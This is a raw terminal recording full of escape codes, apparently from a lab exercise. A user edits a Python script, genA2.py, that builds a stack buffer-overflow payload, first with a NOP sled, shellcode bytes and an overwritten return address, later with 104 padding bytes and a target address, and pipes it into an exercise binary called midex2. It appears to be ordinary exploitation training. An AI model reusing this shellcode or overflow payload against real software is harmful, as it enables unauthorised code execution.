[1;24r[3;9H[95m'[m[38;5;224m\x31\xc0\x89\xc3\xb0\x17\xcd\x80\x31\xd2[m[95m'[m +[23;1H[94m~                                                                              [m[24;62H[K[24;62H3,53[10CAll[3;53H[?25h[?25l[3;52H[K[24;65H2[3;52H[?25h[?25l[24;65H1[3;51H[?25h[?25l[3;50H[K[4;1H[95mpadding = [m[1CA[1C[95m * (128- 64 -32)
eip = [m[1C\x10\xf6\xff\xbf
[95mprint nopsled + shellcode +  padding + eip [m[24;65H0[3;50H[?25h[?25l[95m\xd[m[3;49H[K[24;64H49[3;49H[?25h[?25l[3;48H[K[24;65H8[3;48H[?25h[?25l[38;5;224m\[m[3;47H[K[24;65H7[3;47H[?25h[?25l[3;46H[K[24;65H6[3;46H[?25h[?25l[95m\x3[m[3;45H[K[24;65H5[3;45H[?25h[?25l[3;44H[K[24;65H4[3;44H[?25h[?25l[38;5;224m\[m[3;43H[K[24;65H3[3;43H[?25h[?25l[3;42H[K[24;65H2[3;42H[?25h[?25l[95m\x8[m[3;41H[K[24;65H1[3;41H[?25h[?25l[3;40H[K[24;65H0[3;40H[?25h[?25l[38;5;224m\[m[3;39H[K[24;64H39[3;39H[?25h[?25l[3;38H[K[24;65H8[3;38H[?25h[?25l[95m\xc[m[3;37H[K[24;65H7[3;37H[?25h[?25l[3;36H[K[24;65H6[3;36H[?25h[?25l[38;5;224m\[m[3;35H[K[24;65H5[3;35H[?25h[?25l[3;34H[K[24;65H4[3;34H[?25h[?25l[95m\x1[m[3;33H[K[24;65H3[3;33H[?25h[?25l[3;32H[K[24;65H2[3;32H[?25h[?25l[38;5;224m\[m[3;31H[K[24;65H1[3;31H[?25h[?25l[3;30H[K[24;65H0[3;30H[?25h[?25l[95m\xb[m[3;29H[K[24;64H29[3;29H[?25h[?25l[3;28H[K[24;65H8[3;28H[?25h[?25l[38;5;224m\[m[3;27H[K[24;65H7[3;27H[?25h[?25l[3;26H[K[24;65H6[3;26H[?25h[?25l[95m\xc[m[3;25H[K[24;65H5[3;25H[?25h[?25l[3;24H[K[24;65H4[3;24H[?25h[?25l[38;5;224m\[m[3;23H[K[24;65H3[3;23H[?25h[?25l[3;22H[K[24;65H2[3;22H[?25h[?25l[95m\x8[m[3;21H[K[24;65H1[3;21H[?25h[?25l[3;20H[K[24;65H0[3;20H[?25h[?25l[38;5;224m\[m[3;19H[K[24;64H19[3;19H[?25h[?25l[3;18H[K[24;65H8[3;18H[?25h[?25l[95m\xc[m[3;17H[K[24;65H7[3;17H[?25h[?25l[3;16H[K[24;65H6[3;16H[?25h[?25l[38;5;224m\[m[3;15H[K[24;65H5[3;15H[?25h[?25l[3;14H[K[24;65H4[3;14H[?25h[?25l[95m\x3[m[3;13H[K[24;65H3[3;13H[?25h[?25l[3;12H[K[24;65H2[3;12H[?25h[?25l[38;5;224m\[m[3;11H[K[24;65H1[3;11H[?25h[?25l[3;10H[K[24;65H0[3;10H[?25h[?25l[3;9H[K[4;1Hpadding = [1C[95mA[m[1C * ([3C- [2C -[2C)
eip = [1C[38;5;224m\x10\xf6\xff\xbf[m
[1m[96mprint[m nopsled + shellcode +  padding + eip [24;64H9 [3;9H[?25h[?25l[24;64H5[3;5H[?25h[?25l[24;64H1[3;1H[?25h[?25l[2;23r[23;1H
[1;24r[2;1Hshellcode = ([23;1H[94m~                                                                              [m[24;62H[K[24;62H2,14[10CAll[2;14H[?25h[?25l[2;13H[K[24;65H3[2;13H[?25h[?25l[24;65H2[2;12H[?25h[?25l[2;11H[K[24;65H1[2;11H[?25h[?25l[24;65H0[2;10H[?25h[?25l[2;9H[K[24;64H9 [2;9H[?25h[?25l[2;8H[K[24;64H8[2;8H[?25h[?25l[2;7H[K[24;64H7[2;7H[?25h[?25l[2;6H[K[24;64H6[2;6H[?25h[?25l[2;5H[K[24;64H5[2;5H[?25h[?25l[2;4H[K[24;64H4[2;4H[?25h[?25l[2;3H[K[24;64H3[2;3H[?25h[?25l[2;2H[K[24;64H2[2;2H[?25h[?25l[2;1H[K[24;64H1[2;1H[?25h[?25l[1;23r[23;1H
[1;24r[1;1H[96m#!/usr/bin/python[m[23;1H[94m~                                                                              [m[24;62H[K[24;62H1,18[10CAll[1;18H[?25h[?25l[1;17H[K[24;65H7[1;17H[?25h[?25l[1;16H[K[24;65H6[1;16H[?25h[?25l[96mo[m[24;65H7[1;17H[?25h[?25l[96mn[m[24;65H8[1;18H[?25h[?25l[2;17H[46m([11C)[m[24;62H2[2;18H[?25h[?25l([11C)[24;62H3[3;18H[?25h[?25l[24;62H4[4;18H[?25h[?25l[24;62H3[3;18H[?25h[?25l[24;65H9[3;19H[?25h[?25l[24;62H2[2;19H[?25h[?25l[24;64H20[2;20H[?25h[?25l[24;65H1[2;21H[?25h[?25l[24;65H2[2;22H[?25h[?25l[24;65H3[2;23H[?25h[?25l[24;65H4[2;24H[?25h[?25l[24;65H5[2;25H[?25h[?25l[24;65H6[2;26H[?25h[?25l[24;65H7[2;27H[?25h[?25l[24;65H8[2;28H[?25h[?25l[2;17H[46m([11C)[m[24;65H9[2;29H[?25h[?25l[24;64H30[2;30H[?25h[?25l[2;29H[K[2;17H([24;64H29[2;29H[?25h[?25l[2;28H[K[24;65H8[2;28H[?25h[?25l[2;27H[K[24;65H7[2;27H[?25h[?25l[2;26H[K[24;65H6[2;26H[?25h[?25l[24;65H5[2;25H[?25h[?25l[2;24H[K[24;65H4[2;24H[?25h[?25l[2;23H[K[24;65H3[2;23H[?25h[?25l[24;65H2[2;22H[?25h[?25l[2;21H[K[24;65H1[2;21H[?25h[?25l[2;20H[K[24;65H0[2;20H[?25h[?25l[2;19H[K[24;64H19[2;19H[?25h[?25l[2;18H[K[24;65H8[2;18H[?25h[?25l[2;17H[K[24;65H7[2;17H[?25h[?25l[95m1[m[24;65H8[2;18H[?25h[?25l[95m0[m[24;65H9[2;19H[?25h[?25l[95m4[m[24;64H20[2;20H[?25h[?25l[24;62H3[3;20H[?25h[?25l[24;62H4[4;20H[?25h[?25l[24;65H1[4;21H[?25h[?25l[24;65H2[4;22H[?25h[?25l[24;65H3[4;23H[?25h[?25l[24;65H4[4;24H[?25h[?25l[24;65H5[4;25H[?25h[?25l[24;65H6[4;26H[?25h[?25l[24;65H7[4;27H[?25h[?25l[24;65H8[4;28H[?25h[?25l[24;65H9[4;29H[?25h[?25l[24;64H30[4;30H[?25h[?25l[24;65H1[4;31H[?25h[?25l[24;65H2[4;32H[?25h[?25l[24;65H3[4;33H[?25h[?25l[24;65H4[4;34H[?25h[?25l[24;65H5[4;35H[?25h[?25l[24;65H4[4;34H[?25h[?25l[24;65H3[4;33H[?25h[?25l[24;65H2[4;32H[?25h[?25l[24;65H1[4;31H[?25h[?25l[24;65H0[4;30H[?25h[?25l[24;64H29[4;29H[?25h[?25l[24;65H8[4;28H[?25h[?25l[24;65H7[4;27H[?25h[?25l[24;65H6[4;26H[?25h[?25l[24;65H5[4;25H[?25h[?25l[24;65H6[4;26H[?25h[?25l[24;65H7[4;27H[?25h[?25l[24;65H8[4;28H[?25h[?25l  padding + eip [24;65H7[4;27H[?25h[?25l padding + eip [24;65H6[4;26H[?25h[?25l  padding + eip [24;65H5[4;25H[?25h[?25l  padding + eip [24;65H4[4;24H[?25h[?25l  padding + eip [24;65H3[4;23H[?25h[?25l  padding + eip [24;65H2[4;22H[?25h[?25l  padding + eip [24;65H1[4;21H[?25h[?25l  padding + eip [24;65H0[4;20H[?25h[?25l  padding + eip [24;64H19[4;19H[?25h[?25l  padding + eip [24;65H8[4;18H[?25h[?25l  padding + eip [24;65H7[4;17H[?25h[?25l padding + eip [24;65H6[4;16H[?25h[?25l  padding + eip [24;65H5[4;15H[?25h[?25l padding + eip [24;65H4[4;14H[?25h[?25l  padding + eip [24;65H3[4;13H[?25h[?25l  padding + eip [24;65H2[4;12H[?25h[?25l  padding + eip [24;65H1[4;11H[?25h[?25l  padding + eip [24;65H0[4;10H[?25h[?25l  padding + eip [24;64H9 [4;9H[?25h[?25l  padding + eip [24;64H8[4;8H[?25h[?25l  padding + eip [24;64H7[4;7H[?25h[?25l[24;62H3[3;7H[?25h[?25l[24;64H8[3;8H[?25h[?25l[24;64H9[3;9H[?25h[?25l[24;64H10[3;10H[?25h[?25l[24;65H1[3;11H[?25h[?25l[24;65H2[3;12H[?25h[?25l[24;65H3[3;13H[?25h[?25l[24;65H4[3;14H[?25h[?25l[24;65H5[3;15H[?25h[?25l[24;65H6[3;16H[?25h[?25l[24;65H7[3;17H[?25h[?25l[24;65H8[3;18H[?25h[?25l[24;65H9[3;19H[?25h[?25l[24;64H20[3;20H[?25h[?25l[24;65H1[3;21H[?25h[?25l[24;65H2[3;22H[?25h[?25l[24;65H3[3;23H[?25h[?25l[24;65H4[3;24H[?25h[?25l[95m\xb'[m[3;24H[K[24;65H3[3;23H[?25h[?25l[95m'[m[3;23H[K[24;65H2[3;22H[?25h[?25l[38;5;224m\'[m[3;22H[K[4;1H[95mprint   padding + eip [m[24;65H1[3;21H[?25h[?25l[95m'[m[3;21H[K[4;1H[1m[96mprint[m   padding + eip [24;65H0[3;20H[?25h[?25l[95m\xf'[m[3;20H[K[24;64H19[3;19H[?25h[?25l[95m'[m[3;19H[K[24;65H8[3;18H[?25h[?25l[38;5;224m\'[m[3;18H[K[4;1H[95mprint   padding + eip [m[24;65H7[3;17H[?25h[?25l[95m'[m[3;17H[K[4;1H[1m[96mprint[m   padding + eip [24;65H6[3;16H[?25h[?25l[95m\xf'[m[3;16H[K[24;65H5[3;15H[?25h[?25l[95m'[m[3;15H[K[24;65H4[3;14H[?25h[?25l[38;5;224m\'[m[3;14H[K[4;1H[95mprint   padding + eip [m[24;65H3[3;13H[?25h[?25l[95m'[m[3;13H[K[4;1H[1m[96mprint[m   padding + eip [24;65H2[3;12H[?25h[?25l[95m\x1'[m[3;12H[K[24;65H1[3;11H[?25h[?25l[95m'[m[3;11H[K[24;65H0[3;10H[?25h[?25l[38;5;224m\'[m[3;10H[K[4;1H[95mprint   padding + eip [m[24;64H9 [3;9H[?25h[?25l[95m\c'[m
[1m[96mprint[m   padding + eip [24;64H10[3;10H[?25h[?25l[95m1'[m[24;65H1[3;11H[?25h[?25l[24;65H0[3;10H[?25h[?25l[24;64H9 [3;9H[?25h[?25l[38;5;224m\xc1[m[95m'[m[24;64H10[3;10H[?25h[?25l[24;65H1[3;11H[?25h[?25l[24;65H2[3;12H[?25h[?25l[38;5;224m\'[m
[95mprint   padding + eip [m[24;65H3[3;13H[?25h[?25l[95m\x'[m
[1m[96mprint[m   padding + eip [24;65H4[3;14H[?25h[?25l[95m9'[m[24;65H5[3;15H[?25h[?25l[38;5;224m\x91[m[95m'[m[24;65H6[3;16H[?25h[?25l[38;5;224m\'[m
[95mprint   padding + eip [m[24;65H7[3;17H[?25h[?25l[95m\x'[m
[1m[96mprint[m   padding + eip [24;65H8[3;18H[?25h[?25l[95m0'[m[24;65H9[3;19H[?25h[?25l[38;5;224m\x04[m[95m'[m[24;64H20[3;20H[?25h[?25l[38;5;224m\'[m
[95mprint   padding + eip [m[24;65H1[3;21H[?25h[?25l[95m\x'[m
[1m[96mprint[m   padding + eip [24;65H2[3;22H[?25h[?25l[95m0'[m[24;65H3[3;23H[?25h[?25l[38;5;224m\x08[m[95m'[m[24;65H4[3;24H[?25h[?25l[24;62H4,23[4;23H[?25h[?25l[24;65H2[4;22H[?25h[?25l[24;65H3[4;23H[?25h[24;1H[K[4;22H[?25l[24;52H^[[4;22H[24;52H  [4;23H[24;62H4,22[10CAll[4;22H[?25h[?25l[24;52H:[4;22H[24;52H[K[24;1H:[?2004h[?25hw[?25l[?25hq[?25l[?25ha[?25l[?25h[?25l[?1006l[?1002l[?2004l"genA2.py" 4L, 86C written[23;2t[23;1t[22;2t[22;1t[23;2t[23;1t
[?2004l[?1l>[?25h[?1049l[23;0;0t]0;user01@kali: ~[01;31muser01@kali[00m:[01;34m~[00m$ python genA2.py 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAÁ‘
]0;user01@kali: ~[01;31muser01@kali[00m:[01;34m~[00m$ python genA2.py > A2
]0;user01@kali: ~[01;31muser01@kali[00m:[01;34m~[00m$ MID[K[K[Kmid[K[K[Kgdb [K[K[K[K./m [K[Kmidex2 <[K> a2[K[KA2
A2
]0;user01@kali: ~[01;31muser01@kali[00m:[01;34m~[00m$ ./midex2 > A2[C[1P A2< A2[C$A2(A2CA2[CA2TA2[1PA2[1P2[1PA2CA2aA2tA2 A2[1PA2[1PA2[1PA2[1PA2cA2aA2tA2 A2[C[C)
bash: $(cat A2): ambiguous redirect
]0;user01@kali: ~[01;31muser01@kali[00m:[01;34m~[00m$ ./midex2 < $(cat A2)[C[C[C[C[C[C[C[K[K[K[K[K[K[K[K[K[K[K
cat   $(cat A2)
Not good
]0;user01@kali: ~[01;31muser01@kali[00m:[01;34m~[00m$ ./midex2 [C< $(cat A2)[1P[1P
^[[A^[[B        

^C
]0;user01@kali: ~[01;31muser01@kali[00m:[01;34m~[00m$ 
]0;user01@kali: ~[01;31muser01@kali[00m:[01;34m~[00m$ VI[K[Kvi [K[K[K./midex [K2 < $)([K[K(cat [K[K[K[Kpython midex2.c[Kpy[K[K[K[K[K[K[K[K[Kgena2[K[KA2.PY[K[KPy)
python: can't open file 'genA2.Py': [Errno 2] No such file or directory
bash: $(python genA2.Py): ambiguous redirect
]0;user01@kali: ~[01;31muser01@kali[00m:[01;34m~[00m$ python get[Kbn[K[KnA2.py  > a[KA2
]0;user01@kali: ~[01;31muser01@kali[00m:[01;34m~[00m$ python genA2.py  > A2[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C./midex2 < $(python genA2.Py)[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[KCAT [K[K[K[KCat A[K[K[K[K[KCAT [K[K[K[KCat [K[K[K[Kcat 2[KA2)
bash: $(cat A2): No such file or directory
]0;user01@kali: ~[01;31muser01@kali[00m:[01;34m~[00m$ ./midex2 < $(cat A2)[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[Kls
A2        genA2.py    [0m[37;41mmidex1[0m    [01;32mmidex2[0m    pw.txt     typescript1
genA1.py  input1.txt  midex1.c  midex2.c  README.md  typescript2
]0;user01@kali: ~[01;31muser01@kali[00m:[01;34m~[00m$ ls./midex2 < $(cat A2)
bash: $(cat A2): No such file or directory
]0;user01@kali: ~[01;31muser01@kali[00m:[01;34m~[00m$ ./midex2 < $(cat A2)[C[1P
Not good
]0;user01@kali: ~[01;31muser01@kali[00m:[01;34m~[00m$ A2
bash: A2: command not found
]0;user01@kali: ~[01;31muser01@kali[00m:[01;34m~[00m$ VI A[K[K[K[Kvi A2
[?1000h[?2004h[?1049h[22;0;0t[?1h=[?2004h[1;24r[?12h[?12l[22;2t[22;1t[27m[23m[29m[m[H[2J[?25l[24;1H"A2" 1L, 109C[2;1Hâ–½[6n[2;1H  [1;1H[>c]10;?]11;?[1;1HAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[2;1HAAAAAAAAAAAAAAAAAAAAAAAAAQ[34m^D^H[m
[94m~                                                                              [4;1H~                                                                              [5;1H~                                                                              [6;1H~                                                                              [7;1H~                                                                              [8;1H~                                                                              [9;1H~                                                                              [10;1H~                                                                              [11;1H~                                                                              [12;1H~                                                                              [13;1H~                                                                              [14;1H~                                                                              [15;1H~                                                                              [16;1H~                                                                              [17;1H~                                                                              [18;1H~                                                                              [19;1H~                                                                              [20;1H~                                                                              [21;1H~                                                                              [22;1H~                                                                              [23;1H~                                                                              [m[24;62H1,1[11CAll[1;1H[?25hP+q436f\P+q6b75\P+q6b64\P+q6b72\P+q6b6c\P+q2332\P+q2334\P+q2569\P+q2a37\P+q6b31\[?1000l[?1006h[?1002h[?1006l[?1002l[?1006h[?1002h[27m[23m[29m[m[H[2J[?25l[1;1HAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[2;1HAAAAAAAAAAAAAAAAAAAAAAAAAQ[38;5;81m^D^H[m
[94m~                                                                              [4;1H~                                                                              [5;1H~                                                                              [6;1H~                                                                              [7;1H~                                                                              [8;1H~                                                                              [9;1H~                                                                              [10;1H~                                                                              [11;1H~                                                                              [12;1H~                                                                              [13;1H~                                                                              [14;1H~                                                                              [15;1H~                                                                              [16;1H~                                                                              [17;1H~                                                                              [18;1H~                                                                              [19;1H~                                                                              [20;1H~                                                                              [21;1H~                                                                              [22;1H~                                                                              [23;1H~                                                                              [m[24;62H1,1[11CAll"A2" 1L, 109C[1;1H[?25h[?25l[24;52H~@k[1;1H[24;52H   [1;1H[?25h[?25l[24;52H~@k[1;1H[24;52H   [1;2H[24;64H2[1;2H[?25h[?25l[24;52H~@k[1;2H[24;52H   [1;2H[?25h[?25l[24;52H~@k[1;2H[24;52H   [1;3H[24;64H3[1;3H[?25h[?25l[24;52H~@k[1;3H[24;52H   [1;3H[?25h[?25l[24;52H~@k[1;3H[24;52H   [1;4H[24;64H4[1;4H[?25h[?25l[24;64H33[1;33H[?25h[?25l[24;64H108[2;29H[?25h[?25l[24;52H~@k[2;29H[24;52H   [2;29H[?25h[?25l[24;52H~@k[2;29H[24;52H   [2;29H[?25h[?25l[24;52HI[2;29H[24;52H [1;1H[24;1H[1m-- INSERT --[m[24;13H[K[24;62H1,1[11CAll[1;1H[?25h[?25l[24;64H2[1;2H[?25h[?25l[24;64H3[1;3H[?25h[?25l[24;64H4[1;4H[?25h[?25l[24;64H5[1;5H[?25h[?25l[24;64H23[1;23H[?25h[?25l[24;65H4[1;24H[?25h[?25l[24;65H5[1;25H[?25h[?25l[24;65H6[1;26H[?25h[?25l[24;65H7[1;27H[?25h[?25l[24;65H8[1;28H[?25h[?25l[24;65H9[1;29H[?25h[?25l[24;64H30[1;30H[?25h[?25l[24;65H1[1;31H[?25h[?25l[24;65H2[1;32H[?25h[?25l[24;65H3[1;33H[?25h[?25l[24;65H4[1;34H[?25h[?25l[24;65H5[1;35H[?25h[?25l[24;65H6[1;36H[?25h[?25l[24;65H7[1;37H[?25h[?25l[24;65H8[1;38H[?25h[?25l[24;65H9[1;39H[?25h[?25l[24;64H40[1;40H[?25h[?25l[24;65H1[1;41H[?25h[?25l[24;65H2[1;42H[?25h[?25l[24;65H3[1;43H[?25h[?25l[24;65H4[1;44H[?25h[?25l[24;65H5[1;45H[?25h[?25l[24;65H6[1;46H[?25h[?25l[24;65H7[1;47H[?25h[?25l[24;65H8[1;48H[?25h[?25l[24;65H9[1;49H[?25h[?25l[24;64H50[1;50H[?25h[?25l[24;65H1[1;51H[?25h[?25l[24;65H2[1;52H[?25h[?25l[24;65H3[1;53H[?25h[?25l[24;65H4[1;54H[?25h[?25l[24;65H5[1;55H[?25h[?25l[24;65H6[1;56H[?25h[?25l[24;65H7[1;57H[?25h[?25l[24;65H8[1;58H[?25h[?25l[24;65H9[1;59H[?25h[?25l[24;64H60[1;60H[?25h[?25l[24;65H1[1;61H[?25h[?25l[24;65H2[1;62H[?25h[?25l[24;65H3[1;63H[?25h[?25l[24;65H4[1;64H[?25h[?25l[24;65H5[1;65H[?25h[?25l[24;65H6[1;66H[?25h[?25l[24;65H7[1;67H[?25h[?25l[24;65H8[1;68H[?25h[?25l[24;65H9[1;69H[?25h[?25l[24;64H70[1;70H[?25h[?25l[24;65H1[1;71H[?25h[?25l[24;65H2[1;72H[?25h[?25l[24;65H3[1;73H[?25h[?25l[24;65H4[1;74H[?25h[?25l[24;65H5[1;75H[?25h[?25l[24;65H6[1;76H[?25h[?25l[24;65H7[1;77H[?25h[?25l[24;65H8[1;78H[?25h[?25l[24;65H9[1;79H[?25h[?25l[24;64H80[2;1H[?25h[?25l[24;65H1[2;2H[?25h[?25l[24;65H2[2;3H[?25h[?25l[24;65H3[2;4H[?25h[?25l[24;65H4[2;5H[?25h[?25l[24;65H5[2;6H[?25h[?25l[24;65H6[2;7H[?25h[?25l[24;65H7[2;8H[?25h[?25l[24;65H8[2;9H[?25h[?25l[24;65H9[2;10H[?25h[?25l[24;64H90[2;11H[?25h[?25l[24;65H1[2;12H[?25h[?25l[24;65H2[2;13H[?25h[?25l[24;65H3[2;14H[?25h[?25l[24;65H4[2;15H[?25h[?25l[24;65H5[2;16H[?25h[?25l[24;65H6[2;17H[?25h[?25l[24;65H7[2;18H[?25h[?25l[24;65H8[2;19H[?25h[?25l[24;65H9[2;20H[?25h[?25l[24;64H100[2;21H[?25h[?25l[24;66H1[2;22H[?25h[?25l[24;66H2[2;23H[?25h[?25l[24;66H3[2;24H[?25h[?25l[24;66H4[2;25H[?25h[?25l[24;66H5[2;26H[?25h[?25l[24;66H7-106[2;27H[?25h[?25l[24;66H8    [2;29H[?25h[?25l[24;66H9-110[2;31H[?25h[?25l[2;29H[K[24;66H8    [2;29H[?25h[?25l[2;27H[K[24;66H7-106[2;27H[?25h[?25l[2;26H[K[24;66H5    [2;26H[?25h[24;1H[K[2;25H[?25l[24;52H^[[2;25H[24;52H  [2;26H[24;62H1,104[9CAll[2;25H[?25h[?25l[24;52H:[2;25H[24;52H[K[24;1H:[?2004h[?25hQ[?25l[?25h![?25l[?25h[?25l[97m[41mE492: Not an editor command: Q![2;25H[m[24;62H1,104[9CAll[2;25H[?25h[?25l[24;52H^[[2;25H[24;52H  [2;25H[24;52H^[[2;25H[24;52H  [2;25H[?25h[?25l[24;52H:[2;25H[24;1H[K[24;1H:[?2004h[?25hQ[?25l[?25h[?25l[24;2H[K[24;2H[?25hQ[?25l[?25h![?25l[?25h[?25l[24;3H[K[24;3H[?25h[?25l[24;2H[K[24;2H[?25hq[?25l[?25h![?25l[?25h[?25l[?1006l[?1002l[?2004l[23;2t[23;1t[22;2t[22;1t[23;2t[23;1t[24;1H[K[24;1H[?2004l[?1l>[?25h[?1049l[23;0;0t]0;user01@kali: ~[01;31muser01@kali[00m:[01;34m~[00m$ vi genA2.py 
[?1000h[?2004h[?1049h[22;0;0t[?1h=[?2004h[1;24r[?12h[?12l[22;2t[22;1t[27m[23m[29m[m[H[2J[?25l[24;1H"genA2.py" 4L, 86C[2;1Hâ–½[6n[2;1H  [1;1H[>c]10;?]11;?[1;1H[34m#!/usr/bin/python[m
padding = [31m'A'[m * [31m104[m
eip = [31m'[m[35m\xc1\x91\x04\x08[m[31m'[m
[36mprint[m   padding + eip
[94m~                                                                              [6;1H~                                                                              [7;1H~                                                                              [8;1H~                                                                              [9;1H~                                                                              [10;1H~                                                                              [11;1H~                                                                              [12;1H~                                                                              [13;1H~                                                                              [14;1H~                                                                              [15;1H~                                                                              [16;1H~                                                                              [17;1H~                                                                              [18;1H~                                                                              [19;1H~                                                                              [20;1H~                                                                              [21;1H~                                                                              [22;1H~                                                                              [23;1H~                                                                              [m[24;62H4,22[10CAll[4;22H[?25hP+q436f\P+q6b75\P+q6b64\P+q6b72\P+q6b6c\P+q2332\P+q2334\P+q2569\P+q2a37\P+q6b31\[?1000l[?1006h[?1002h[?1006l[?1002l[?1006h[?1002h[27m[23m[29m[m[H[2J[?25l[1;1H[96m#!/usr/bin/python[m
padding = [95m'A'[m * [95m104[m
eip = [95m'[m[38;5;224m\xc1\x91\x04\x08[m[95m'[m
[1m[96mprint[m   padding + eip
[94m~                                                                              [6;1H~                                                                              [7;1H~                                                                              [8;1H~                                                                              [9;1H~                                                                              [10;1H~                                                                              [11;1H~                                                                              [12;1H~                                                                              [13;1H~                                                                              [14;1H~                                                                              [15;1H~                                                                              [16;1H~                                                                              [17;1H~                                                                              [18;1H~                                                                              [19;1H~                                                                              [20;1H~                                                                              [21;1H~                                                                              [22;1H~                                                                              [23;1H~                                                                              [m[24;62H4,22[10CAll"genA2.py" 4L, 86C[4;22H[?25h[?25l[24;52H^[[4;22H[24;52H  [4;22H[24;52H^[[4;22H[24;52H  [4;22H[?25h[?25l[24;52H:[4;22H[24;1H[K[24;1H:[?2004h[?25hq[?25l[?25h![?25l[?25h[?25l[?1006l[?1002l[?2004l[23;2t[23;1t[22;2t[22;1t[23;2t[23;1t[24;1H[K[24;1H[?2004l[?1l>[?25h[?1049l[23;0;0t]0;user01@kali: ~[01;31muser01@kali[00m:[01;34m~[00m$ python genA2.py > A2
]0;user01@kali: ~[01;31muser01@kali[00m:[01;34m~[00m$ vi A2
[?1000h[?2004h[?1049h[22;0;0t[?1h=[?2004h[1;24r[?12h[?12l[22;2t[22;1t[27m[23m[29m[m[H[2J[?25l[24;1H"A2" 1L, 109C[2;1Hâ–½[6n[2;1H  [1;1H[>c]10;?]11;?[1;1HAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[2;1HAAAAAAAAAAAAAAAAAAAAAAAAAQ[34m^D^H[m
[94m~                                                                              [4;1H~                                                                              [5;1H~                                                                              [6;1H~                                                                              [7;1H~                                                                              [8;1H~                                                                              [9;1H~                                                                              [10;1H~                                                                              [11;1H~                                                                              [12;1H~                                                                              [13;1H~                                                                              [14;1H~                                                                              [15;1H~                                                                              [16;1H~                                                                              [17;1H~                                                                              [18;1H~                                                                              [19;1H~                                                                              [20;1H~                                                                              [21;1H~                                                                              [22;1H~                                                                              [23;1H~                                                                              [m[24;62H1,104[9CAll[2;25H[?25hP+q436f\P+q6b75\P+q6b64\P+q6b72\P+q6b6c\P+q2332\P+q2334\P+q2569\P+q2a37\P+q6b31\[?1000l[?1006h[?1002h[?1006l[?1002l[?1006h[?1002h[27m[23m[29m[m[H[2J[?25l[1;1HAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[2;1HAAAAAAAAAAAAAAAAAAAAAAAAAQ[38;5;81m^D^H[m
[94m~                                                                              [4;1H~                                                                              [5;1H~                                                                              [6;1H~                                                                              [7;1H~                                                                              [8;1H~                                                                              [9;1H~                                                                              [10;1H~                                                                              [11;1H~                                                                              [12;1H~                                                                              [13;1H~                                                                              [14;1H~                                                                              [15;1H~                                                                              [16;1H~                                                                              [17;1H~                                                                              [18;1H~                                                                              [19;1H~                                                                              [20;1H~                                                                              [21;1H~                                                                              [22;1H~                                                                              [23;1H~                                                                              [m[24;62H1,104[9CAll"A2" 1L, 109C[2;25H[?25h[?25l[24;52HI[2;25H[24;52H [1;1H[24;1H[1m-- INSERT --[m[24;13H[K[24;62H1,1[11CAll[1;1H[?25h[?25l[24;64H2[1;2H[?25h[?25l[24;64H3[1;3H[?25h[?25l[24;64H4[1;4H[?25h[?25l[24;64H5[1;5H[?25h[?25l[24;64H6[1;6H[?25h[?25l[24;64H7[1;7H[?25h[?25l[24;64H8[1;8H[?25h[?25l[24;64H9[1;9H[?25h[?25l[24;64H10[1;10H[?25h[?25l[24;65H1[1;11H[?25h[?25l[24;65H2[1;12H[?25h[?25l[24;65H3[1;13H[?25h[?25l[24;65H4[1;14H[?25h[?25l[24;65H5[1;15H[?25h[?25l[24;65H6[1;16H[?25h[?25l[24;65H7[1;17H[?25h[?25l[24;65H8[1;18H[?25h[?25l[24;65H9[1;19H[?25h[?25l[24;64H20[1;20H[?25h[?25l[24;65H1[1;21H[?25h[?25l[24;64H50[1;50H[?25h[?25l[24;64H33[1;33H[?25h[24;1H[K[1;32H[?25l[24;52H^[[1;32H[24;52H  [1;33H[24;62H1,32[10CAll[1;32H[?25h[?25l[24;52H:[1;32H[24;52H[K[24;1H:[?2004h[?25hQ[?25l[?25h![?25l[?25h[?25l[97m[41mE492: Not an editor command: Q![1;32H[m[24;62H1,32[10CAll[1;32H[?25h[?25l[24;52Hq[1;32H[?25h[?25l[24;53H:[1;32H[24;52H  [1;32H[24;1H[K[24;1H:[?2004h[15;1H[7mA2                                                           1,32           All[m[16;1H[94m:[mWQA[16;5H[K[17;1H[94m:[m[93mwq[m[17;4H[K[18;1H[94m:[m[93mwqa[m[18;5H[K[19;1H[94m:[m[93mq[m![19;4H[K[20;1H[94m:[mQ![20;4H[K[21;1H[94m:[m[21;2H[K[22;1H[94m:~[m
[1m[7m[Command Line]                                               6,0-1          All[21;2H[?25h[?25l[m[24;69H:^[[21;2H[24;70H  [21;2H[24;70H^[[21;2H[24;69H   [21;2H[?25h[?25l[24;69Hq[21;2H[?25h[?25l[24;70H1[21;2H


[1mrecording @1[m[24;69H[K[21;2H[?25h[?25l[24;69H^[[21;2H[24;69H  [21;2H[24;69H^[[21;2H[24;69H  [21;2H[?25h[?25l[24;69H^D[21;2H[24;69H  [21;2H[?25h[?25l[24;69H^M[21;2H[24;69H  [21;2H


[15;1H[94m~                                                                              [16;1H~                                                                              [17;1H~                                                                              [18;1H~                                                                              [19;1H~                                                                              [20;1H~                                                                              [21;1H~                                                                              [22;1H~  
~                                                                              [m[24;62H1,32[10CAll[1;32H[?25h[?25l[24;52H^[[1;32H[24;52H  [1;32H[24;52H^[[1;32H[24;52H  [1;32H[?25h[?25l[24;52H:[1;32H[24;1H[K[24;1H:[?2004h[?25hq[?25l[?25h![?25l[?25h[?25l[?1006l[?1002l[?2004l[23;2t[23;1t[22;2t[22;1t[23;2t[23;1t[24;1H[K[24;1H[?2004l[?1l>[?25h[?1049l[23;0;0t]0;user01@kali: ~[01;31muser01@kali[00m:[01;34m~[00m$ vi A2[K[KINP[K[K[KIn[K[Kinput1.txt 
